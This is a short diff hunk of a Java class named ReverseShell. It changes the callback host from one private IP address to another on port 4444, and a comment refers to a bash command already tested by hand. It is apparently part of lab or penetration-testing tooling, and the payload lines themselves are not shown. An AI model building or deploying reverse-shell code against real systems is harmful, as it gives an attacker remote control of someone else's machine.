@@ -2,7 +2,7 @@ import java.io.IOException;
 
 public class ReverseShell {
     public static void main(String[] args) {
-        String host = "192.168.29.205";
+        String host = "192.168.29.60";
         int port = 4444;
 
         // This is exactly the bash command you already tested manually
